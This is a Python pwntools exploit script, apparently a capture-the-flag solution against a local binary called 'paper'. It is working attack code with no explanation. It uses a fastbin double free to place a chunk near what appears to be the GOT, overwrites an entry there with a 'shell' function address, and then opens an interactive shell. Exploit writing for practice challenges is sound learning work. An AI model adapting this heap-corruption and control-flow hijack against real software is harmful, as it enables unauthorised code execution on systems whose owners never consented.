from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


io = process("./paper")

def delete(idx):
    io.sendlineafter("2 delete paper\n", '2')
    io.sendlineafter("index(0-9):", str(idx))

def add(idx, size, content):
    io.sendlineafter("2 delete paper\n", '1')
    io.sendlineafter("Input the index you want to store(0-9):", str(idx))
    io.sendlineafter("How long you will enter:", str(size))
    io.sendlineafter('please enter your content:', content)

def secret(num):
    io.sendlineafter("2 delete paper\n", '3')
    io.sendlineafter("enter your luck number:", str(num))

shell = 0x400947

add(0, 0x30, b'a' *8)
add(1, 0x30, b'a' *8)

delete(0)
delete(1)
delete(0)

add(2, 0x30, p64(0x60202a))
add(3, 0x30, b'a' * 8)
add(4, 0x30, b'a' * 8)
# gdb.attach(io)
add(5, 0x30, b'\x40' + b'\x00' * 5 + p64(shell))

io.sendlineafter("2 delete paper\n", '1')

io.interactive()
